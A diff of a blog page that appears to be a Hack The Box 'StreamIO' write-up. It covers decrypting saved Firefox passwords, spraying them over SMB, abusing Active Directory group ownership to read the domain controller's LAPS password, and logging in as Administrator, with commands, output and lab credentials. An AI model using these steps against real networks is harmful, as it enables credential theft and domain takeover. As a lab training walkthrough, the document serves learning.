-</span></span><span class=line><span class=cl>           SEQUENCE <span class=o>{</span>
-</span></span><span class=line><span class=cl>             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
-</span></span><span class=line><span class=cl>           <span class=o>}</span>
-</span></span><span class=line><span class=cl>         <span class=o>}</span>
-</span></span><span class=line><span class=cl>       <span class=o>}</span>
-</span></span><span class=line><span class=cl>       SEQUENCE <span class=o>{</span>
-</span></span><span class=line><span class=cl>         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
-</span></span><span class=line><span class=cl>         OCTETSTRING b<span class=s1>&#39;1baafcd931194d48f8ba5775a41f&#39;</span>
-</span></span><span class=line><span class=cl>       <span class=o>}</span>
-</span></span><span class=line><span class=cl>     <span class=o>}</span>
-</span></span><span class=line><span class=cl>   <span class=o>}</span>
-</span></span><span class=line><span class=cl>   OCTETSTRING b<span class=s1>&#39;12e56d1c8458235a4136b280bd7ef9cf&#39;</span>
-</span></span><span class=line><span class=cl> <span class=o>}</span>
-</span></span><span class=line><span class=cl>clearText b<span class=s1>&#39;70617373776f72642d636865636b0202&#39;</span>
-</span></span><span class=line><span class=cl>password check? True
-</span></span><span class=line><span class=cl> SEQUENCE <span class=o>{</span>
-</span></span><span class=line><span class=cl>   SEQUENCE <span class=o>{</span>
-</span></span><span class=line><span class=cl>     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
-</span></span><span class=line><span class=cl>     SEQUENCE <span class=o>{</span>
-</span></span><span class=line><span class=cl>       SEQUENCE <span class=o>{</span>
-</span></span><span class=line><span class=cl>         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
-</span></span><span class=line><span class=cl>         SEQUENCE <span class=o>{</span>
-</span></span><span class=line><span class=cl>           OCTETSTRING b<span class=s1>&#39;098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e&#39;</span>
-</span></span><span class=line><span class=cl>           INTEGER b<span class=s1>&#39;01&#39;</span>
-</span></span><span class=line><span class=cl>           INTEGER b<span class=s1>&#39;20&#39;</span>
-</span></span><span class=line><span class=cl>           SEQUENCE <span class=o>{</span>
-</span></span><span class=line><span class=cl>             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
-</span></span><span class=line><span class=cl>           <span class=o>}</span>
-</span></span><span class=line><span class=cl>         <span class=o>}</span>
-</span></span><span class=line><span class=cl>       <span class=o>}</span>
-</span></span><span class=line><span class=cl>       SEQUENCE <span class=o>{</span>
-</span></span><span class=line><span class=cl>         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
-</span></span><span class=line><span class=cl>         OCTETSTRING b<span class=s1>&#39;e28a1fe8bcea476e94d3a722dd96&#39;</span>
-</span></span><span class=line><span class=cl>       <span class=o>}</span>
-</span></span><span class=line><span class=cl>     <span class=o>}</span>
-</span></span><span class=line><span class=cl>   <span class=o>}</span>
-</span></span><span class=line><span class=cl>   OCTETSTRING b<span class=s1>&#39;51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266&#39;</span>
-</span></span><span class=line><span class=cl> <span class=o>}</span>
-</span></span><span class=line><span class=cl>clearText b<span class=s1>&#39;b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808&#39;</span>
-</span></span><span class=line><span class=cl>decrypting login/password pairs
-</span></span><span class=line><span class=cl>Using 3DES <span class=o>(</span>32-byte key, truncated to 24<span class=o>)</span>
-</span></span><span class=line><span class=cl>https://slack.streamio.htb:b<span class=s1>&#39;admin&#39;</span>,b<span class=s1>&#39;&#39;</span>
-</span></span><span class=line><span class=cl>https://slack.streamio.htb:b<span class=s1>&#39;nikk37&#39;</span>,b<span class=s1>&#39;n1kk1sd0p3t00:)&#39;</span>
-</span></span><span class=line><span class=cl>https://slack.streamio.htb:b<span class=s1>&#39;yoshihide&#39;</span>,b<span class=s1>&#39;paddpadd@12&#39;</span>
-</span></span><span class=line><span class=cl>https://slack.streamio.htb:b<span class=s1>&#39;JDgodd&#39;</span>,b<span class=s1>&#39;password@12&#39;</span>
-</span></span></code></pre></div><p>Plaintext credentials for four accounts, all saved against the internal Slack subdomain. The interesting one was JDgodd. Spraying all extracted passwords against domain accounts confirmed his:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ✗ nxc smb <span class=nv>$DC_IP</span> -u JDgodd -p passwords.txt
-</span></span><span class=line><span class=cl>SMB         10.129.11.215   <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span> Windows <span class=m>10</span> / Server <span class=m>2019</span> Build <span class=m>17763</span> x64 <span class=o>(</span>name:DC<span class=o>)</span> <span class=o>(</span>domain:streamIO.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:None<span class=o>)</span>
-</span></span><span class=line><span class=cl>SMB         10.129.11.215   <span class=m>445</span>    DC               <span class=o>[</span>+<span class=o>]</span> streamIO.htb<span class=se>\J</span>Dgodd:JDg0dd1s@d0p3cr3@t0r
-</span></span></code></pre></div><p>BloodHound had already shown what JDgodd could do:</p><p><img src=/images/writeups/htb-streamio/bloodhound-jdgodd-owns-core-staff.png alt="BloodHound graph showing JDGODD@STREAMIO.HTB has Owns and WriteOwner edges to CORE STAFF@STREAMIO.HTB group"></p><p><img src=/images/writeups/htb-streamio/bloodhound-core-staff-readlaps-dc.png alt="BloodHound graph showing CORE STAFF@STREAMIO.HTB has a ReadLAPSPassword edge to DC.STREAMIO.HTB"></p><p><code>JDgodd → Owns Core Staff → Core Staff → ReadLAPSPassword → DC</code>.</p><p>JDgodd owns the Core Staff group object. In AD, the owner of an object controls its DACL, the list of who has what permissions on the object. Ownership alone doesn&rsquo;t grant membership, but it does let you modify the group&rsquo;s access control entries. That means JDgodd can grant himself WriteMember rights on the group, then add himself as a member, which puts him in a group with ReadLAPSPassword access to the DC&rsquo;s computer object.</p><p>LAPS stores the DC&rsquo;s local Administrator password as the <code>ms-Mcs-AdmPwd</code> attribute on the computer object in AD. Any member of a group with ReadLAPSPassword access can query that attribute and read the current password directly.</p><p>From nikk37&rsquo;s WinRM session, using JDgodd&rsquo;s credentials as a PSCredential object:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>nikk37</span><span class=p>&gt;</span> <span class=nv>$pass</span> <span class=p>=</span> <span class=nb>ConvertTo-SecureString</span> <span class=s1>&#39;JDg0dd1s@d0p3cr3@t0r&#39;</span> <span class=n>-AsPlainText</span> <span class=n>-Force</span>
-</span></span><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>nikk37</span><span class=p>&gt;</span> <span class=nv>$cred</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Management</span><span class=p>.</span><span class=py>Automation</span><span class=p>.</span><span class=py>PSCredential</span><span class=p>(</span><span class=s1>&#39;streamio.htb\JDgodd&#39;</span><span class=p>,</span> <span class=nv>$pass</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c># Grant JDgodd WriteMember rights on Core Staff (owner can do this)</span>
-</span></span><span class=line><span class=cl><span class=nb>Add-DomainObjectAcl</span> <span class=n>-Credential</span> <span class=nv>$cred</span> <span class=n>-TargetIdentity</span> <span class=s2>&#34;Core Staff&#34;</span> <span class=n>-PrincipalIdentity</span> <span class=s2>&#34;streamio\JDgodd&#34;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c># Add JDgodd as a member</span>
-</span></span><span class=line><span class=cl><span class=nb>Add-DomainGroupMember</span> <span class=n>-Credential</span> <span class=nv>$cred</span> <span class=n>-Identity</span> <span class=s2>&#34;Core Staff&#34;</span> <span class=n>-Members</span> <span class=s2>&#34;StreamIO\JDgodd&#34;</span>
-</span></span></code></pre></div><p>Verified:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\n</span>ikk37&gt; net group <span class=s2>&#34;CORE STAFF&#34;</span> /domain
-</span></span><span class=line><span class=cl> 
-</span></span><span class=line><span class=cl>Group name     CORE STAFF
-</span></span><span class=line><span class=cl>Comment
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>Members
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------
-</span></span><span class=line><span class=cl>JDgodd
-</span></span></code></pre></div><p>Then read the LAPS password. <code>Get-AdComputer</code> with the PSCredential returned the DC&rsquo;s computer object but not the <code>ms-Mcs-AdmPwd</code> attribute:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>*</span><span class=nb>Evil-WinRM</span><span class=p>*</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>nikk37</span><span class=p>&gt;</span> <span class=nb>Get-AdComputer</span> <span class=n>-Filter</span> <span class=p>*</span> <span class=n>-Properties</span> <span class=nb>ms-Mcs</span><span class=n>-AdmPwd</span> <span class=n>-Credential</span> <span class=nv>$cred</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=n>DistinguishedName</span> <span class=err>:</span> <span class=n>CN</span><span class=p>=</span><span class=n>DC</span><span class=p>,</span><span class=n>OU</span><span class=p>=</span><span class=n>Domain</span> <span class=n>Controllers</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>streamIO</span><span class=p>,</span><span class=n>DC</span><span class=p>=</span><span class=n>htb</span>
-</span></span><span class=line><span class=cl><span class=n>DNSHostName</span>       <span class=err>:</span> <span class=n>DC</span><span class=p>.</span><span class=py>streamIO</span><span class=p>.</span><span class=py>htb</span>
-</span></span><span class=line><span class=cl><span class=n>Enabled</span>           <span class=err>:</span> <span class=n>True</span>
-</span></span><span class=line><span class=cl><span class=n>Name</span>              <span class=err>:</span> <span class=n>DC</span>
-</span></span><span class=line><span class=cl><span class=n>ObjectClass</span>       <span class=err>:</span> <span class=n>computer</span>
-</span></span><span class=line><span class=cl><span class=n>ObjectGUID</span>        <span class=err>:</span> <span class=n>8c0f9a80-aaab</span><span class=p>-</span><span class=n>4a78</span><span class=p>-</span><span class=mf>9e0d</span><span class=p>-</span><span class=n>7a4158d8b9ee</span>
-</span></span><span class=line><span class=cl><span class=n>SamAccountName</span>    <span class=err>:</span> <span class=n>DC</span><span class=p>$</span>
-</span></span><span class=line><span class=cl><span class=n>SID</span>               <span class=err>:</span> <span class=n>S</span><span class=p>-</span><span class=mf>1</span><span class=p>-</span><span class=mf>5</span><span class=p>-</span><span class=mf>21</span><span class=p>-</span><span class=mf>1470860369</span><span class=p>-</span><span class=mf>1569627196</span><span class=p>-</span><span class=mf>4264678630</span><span class=p>-</span><span class=mf>1000</span>
-</span></span><span class=line><span class=cl><span class=n>UserPrincipalName</span> <span class=err>:</span>
-</span></span></code></pre></div><p>The attribute just doesn&rsquo;t show. bloodyAD worked fine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ❯ bloodyAD --host 10.129.11.215 -d streamIO.htb -u JDgodd -p <span class=s1>&#39;JDg0dd1s@d0p3cr3@t0r&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  get search --filter <span class=s1>&#39;(ms-mcs-admpwdexpirationtime=*)&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>distinguishedName: <span class=nv>CN</span><span class=o>=</span>DC,OU<span class=o>=</span>Domain Controllers,DC<span class=o>=</span>streamIO,DC<span class=o>=</span>htb
-</span></span><span class=line><span class=cl>ms-Mcs-AdmPwd: 7x/<span class=o>}</span><span class=c1>#R.9&amp;hczaZ</span>
-</span></span><span class=line><span class=cl>ms-Mcs-AdmPwdExpirationTime: <span class=m>134250236444854828</span>
-</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>evil-winrm -i 10.129.11.215 -u Administrator -p <span class=s1>&#39;7x/}#R.9&amp;hczaZ&#39;</span>
-</span></span></code></pre></div><p>Root flag was on Martin&rsquo;s desktop, not Administrator&rsquo;s. Checked <code>C:\Users\Martin\Desktop\</code> for it. The eval() backdoor is what made this box memorable for me. A developer left a <code>file_get_contents</code> feeding directly into <code>eval</code> in a debug parameter that nobody thought to remove from production. One authenticated request to a hidden parameter and you have arbitrary PHP execution. Clean chain, unusually web-heavy for an AD box.</p></div></article></main></div><script>function toggleToc(){const e=document.getElementById("tocContent"),t=document.querySelector(".toc-toggle");if(!e||!t)return;e.classList.toggle("expanded"),t.classList.toggle("expanded")}function toggleMiniToc(){const e=document.getElementById("miniToc");e&&e.classList.toggle("minimized")}function setupActiveHighlighting(e){const n=Array.from(e).map(e=>{const t=e.getAttribute("href");if(t&&t.startsWith("#")){const n=document.getElementById(decodeURIComponent(t.slice(1)));if(n)return{link:e,element:n}}return null}).filter(Boolean);if(n.length===0)return;function s(){const s=window.scrollY+100;let t=null;n.forEach(e=>{e.element.offsetTop<=s&&(t=e)}),e.forEach(e=>e.classList.remove("active")),t&&t.link.classList.add("active")}let t=!1;window.addEventListener("scroll",()=>{t||(requestAnimationFrame(()=>{s(),t=!1}),t=!0)}),s()}function initMiniToc(){const n=document.getElementById("miniToc"),s=document.getElementById("miniTocContent"),o=document.getElementById("tocContent");if(!n||!s||!o)return;const e=o.cloneNode(!0);e.classList.remove("toc-content","expanded"),e.removeAttribute("id");const t=e.querySelectorAll("a");if(t.length===0)return;t.forEach(e=>{e.addEventListener("click",t=>{const n=e.getAttribute("href");if(n&&n.startsWith("#")){const e=document.getElementById(decodeURIComponent(n.slice(1)));e&&(t.preventDefault(),e.scrollIntoView({behavior:"smooth",block:"start"}),history.pushState(null,"",n))}})}),s.appendChild(e),n.classList.add("visible"),setupActiveHighlighting(t)}document.addEventListener("DOMContentLoaded",initMiniToc)</script><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://discord.com/users/kanyo._ target=_blank rel="noopener noreferrer me" title=Discord><svg viewBox="20 15 205 190" fill="currentColor" stroke="none"><path d="M104.4 103.9c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zm36.5.0c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z"/><path d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2.0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6.0.0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3.0.0-8.5 14.5-30.6 15.2z"/></svg></a>
-<a href=https://github.com/Chaelsoo target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a>
-<a href=https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/ target=_blank rel="noopener noreferrer me" title=Linkedin><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a>
-<a href=https://app.hackthebox.com/users/1490281 target=_blank rel="noopener noreferrer me" title=Hackthebox><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1 2 6.5v11L12 23l10-5.5v-11L12 1z"/><path d="M12 12 2 6.5M12 12v11m0-11 10-5.5"/></svg></a></div><small class=footer_copyright>© 2026 .
-Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg>
-</a><script src=https://chaelsoo.me/js/main.min.b09c6387b2f6ee79fac79c531b410d511da72f67534abd4435676936738db1e1.js integrity="sha256-sJxjh7L27nn6x5xTG0ENUR2nL2dTSr1ENWdpNnONseE="></script></body></html>
+</code></pre><p>Firefox stores saved passwords using symmetric encryption. The encryption key is derived from the master password. If no master password is set, the key derivation uses a blank string, which means any tool with the right logic can decrypt the credentials without cracking anything. The credentials themselves are in <code>logins.json</code>, the key material in <code>key4.db</code>, and the certificate database in <code>cert9.db</code>. Downloaded all three, then ran them through firepwd:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/streamIO/firefox ❯ python3 firepwd/firepwd.py -d .
+</span></span><span class="line"><span class="cl">globalSalt: b<span class="s1">&#39;d215c391179edb56af928a06c627906bcbd4bd47&#39;</span>
+</span></span><span class="line"><span class="cl"> SEQUENCE <span class="o">{</span>
+</span></span><span class="line"><span class="cl">   SEQUENCE <span class="o">{</span>
+</span></span><span class="line"><span class="cl">     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
+</span></span><span class="line"><span class="cl">     SEQUENCE <span class="o">{</span>
+</span></span><span class="line"><span class="cl">       SEQUENCE <span class="o">{</span>
+</span></span><span class="line"><span class="cl">         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
+</span></span><span class="line"><span class="cl">         SEQUENCE <span class="o">{</span>
+</span></span><span class="line"><span class="cl">           OCTETSTRING b<span class="s1">&#39;5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5&#39;</span>
+</span></span><span class="line"><span class="cl">           INTEGER b<span class="s1">&#39;01&#39;</span>
+</span></span><span class="line"><span class="cl">           INTEGER b<span class="s1">&#39;20&#39;</span>
+</span></span><span class="line"><span class="cl">           SEQUENCE <span class="o">{</span>
+</span></span><span class="line"><span class="cl">             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
+</span></span><span class="line"><span class="cl">           <span class="o">}</span>
+</span></span><span class="line"><span class="cl">         <span class="o">}</span>
+</span></span><span class="line"><span class="cl">       <span class="o">}</span>
+</span></span><span class="line"><span class="cl">       SEQUENCE <span class="o">{</span>
+</span></span><span class="line"><span class="cl">         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+</span></span><span class="line"><span class="cl">         OCTETSTRING b<span class="s1">&#39;1baafcd931194d48f8ba5775a41f&#39;</span>
+</span></span><span class="line"><span class="cl">       <span class="o">}</span>
+</span></span><span class="line"><span class="cl">     <span class="o">}</span>
+</span></span><span class="line"><span class="cl">   <span class="o">}</span>
+</span></span><span class="line"><span class="cl">   OCTETSTRING b<span class="s1">&#39;12e56d1c8458235a4136b280bd7ef9cf&#39;</span>
+</span></span><span class="line"><span class="cl"> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">clearText b<span class="s1">&#39;70617373776f72642d636865636b0202&#39;</span>
+</span></span><span class="line"><span class="cl">password check? True
+</span></span><span class="line"><span class="cl"> SEQUENCE <span class="o">{</span>
+</span></span><span class="line"><span class="cl">   SEQUENCE <span class="o">{</span>
+</span></span><span class="line"><span class="cl">     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
+</span></span><span class="line"><span class="cl">     SEQUENCE <span class="o">{</span>
+</span></span><span class="line"><span class="cl">       SEQUENCE <span class="o">{</span>
+</span></span><span class="line"><span class="cl">         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
+</span></span><span class="line"><span class="cl">         SEQUENCE <span class="o">{</span>
+</span></span><span class="line"><span class="cl">           OCTETSTRING b<span class="s1">&#39;098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e&#39;</span>
+</span></span><span class="line"><span class="cl">           INTEGER b<span class="s1">&#39;01&#39;</span>
+</span></span><span class="line"><span class="cl">           INTEGER b<span class="s1">&#39;20&#39;</span>
+</span></span><span class="line"><span class="cl">           SEQUENCE <span class="o">{</span>
+</span></span><span class="line"><span class="cl">             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
+</span></span><span class="line"><span class="cl">           <span class="o">}</span>
+</span></span><span class="line"><span class="cl">         <span class="o">}</span>
+</span></span><span class="line"><span class="cl">       <span class="o">}</span>
+</span></span><span class="line"><span class="cl">       SEQUENCE <span class="o">{</span>
+</span></span><span class="line"><span class="cl">         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+</span></span><span class="line"><span class="cl">         OCTETSTRING b<span class="s1">&#39;e28a1fe8bcea476e94d3a722dd96&#39;</span>
+</span></span><span class="line"><span class="cl">       <span class="o">}</span>
+</span></span><span class="line"><span class="cl">     <span class="o">}</span>
+</span></span><span class="line"><span class="cl">   <span class="o">}</span>
+</span></span><span class="line"><span class="cl">   OCTETSTRING b<span class="s1">&#39;51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266&#39;</span>
+</span></span><span class="line"><span class="cl"> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">clearText b<span class="s1">&#39;b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808&#39;</span>
+</span></span><span class="line"><span class="cl">decrypting login/password pairs
+</span></span><span class="line"><span class="cl">Using 3DES <span class="o">(</span>32-byte key, truncated to 24<span class="o">)</span>
+</span></span><span class="line"><span class="cl">https://slack.streamio.htb:b<span class="s1">&#39;admin&#39;</span>,b<span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">https://slack.streamio.htb:b<span class="s1">&#39;nikk37&#39;</span>,b<span class="s1">&#39;n1kk1sd0p3t00:)&#39;</span>
+</span></span><span class="line"><span class="cl">https://slack.streamio.htb:b<span class="s1">&#39;yoshihide&#39;</span>,b<span class="s1">&#39;paddpadd@12&#39;</span>
+</span></span><span class="line"><span class="cl">https://slack.streamio.htb:b<span class="s1">&#39;JDgodd&#39;</span>,b<span class="s1">&#39;password@12&#39;</span>
+</span></span></code></pre></div><p>Plaintext credentials for four accounts, all saved against the internal Slack subdomain. The interesting one was JDgodd. Spraying all extracted passwords against domain accounts confirmed his:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ✗ nxc smb <span class="nv">$DC_IP</span> -u JDgodd -p passwords.txt
+</span></span><span class="line"><span class="cl">SMB         10.129.11.215   <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.11.215   <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:JDg0dd1s@d0p3cr3@t0r
+</span></span></code></pre></div><p>BloodHound had already shown what JDgodd could do:</p>
+<p><img src="/images/writeups/htb-streamio/bloodhound-jdgodd-owns-core-staff.png" alt="BloodHound graph showing JDGODD@STREAMIO.HTB has Owns and WriteOwner edges to CORE STAFF@STREAMIO.HTB group"></p>
+<p><img src="/images/writeups/htb-streamio/bloodhound-core-staff-readlaps-dc.png" alt="BloodHound graph showing CORE STAFF@STREAMIO.HTB has a ReadLAPSPassword edge to DC.STREAMIO.HTB"></p>
+<p><code>JDgodd → Owns Core Staff → Core Staff → ReadLAPSPassword → DC</code>.</p>
+<p>JDgodd owns the Core Staff group object. In AD, the owner of an object controls its DACL, the list of who has what permissions on the object. Ownership alone doesn&rsquo;t grant membership, but it does let you modify the group&rsquo;s access control entries. That means JDgodd can grant himself WriteMember rights on the group, then add himself as a member, which puts him in a group with ReadLAPSPassword access to the DC&rsquo;s computer object.</p>
+<p>LAPS stores the DC&rsquo;s local Administrator password as the <code>ms-Mcs-AdmPwd</code> attribute on the computer object in AD. Any member of a group with ReadLAPSPassword access can query that attribute and read the current password directly.</p>
+<p>From nikk37&rsquo;s WinRM session, using JDgodd&rsquo;s credentials as a PSCredential object:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">nikk37</span><span class="p">&gt;</span> <span class="nv">$pass</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;JDg0dd1s@d0p3cr3@t0r&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">nikk37</span><span class="p">&gt;</span> <span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span><span class="p">(</span><span class="s1">&#39;streamio.htb\JDgodd&#39;</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Grant JDgodd WriteMember rights on Core Staff (owner can do this)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Add-DomainObjectAcl</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-TargetIdentity</span> <span class="s2">&#34;Core Staff&#34;</span> <span class="n">-PrincipalIdentity</span> <span class="s2">&#34;streamio\JDgodd&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Add JDgodd as a member</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Add-DomainGroupMember</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-Identity</span> <span class="s2">&#34;Core Staff&#34;</span> <span class="n">-Members</span> <span class="s2">&#34;StreamIO\JDgodd&#34;</span>
+</span></span></code></pre></div><p>Verified:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\n</span>ikk37&gt; net group <span class="s2">&#34;CORE STAFF&#34;</span> /domain
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">Group name     CORE STAFF
+</span></span><span class="line"><span class="cl">Comment
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Members
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">JDgodd
+</span></span></code></pre></div><p>Then read the LAPS password. <code>Get-AdComputer</code> with the PSCredential returned the DC&rsquo;s computer object but not the <code>ms-Mcs-AdmPwd</code> attribute:</p>
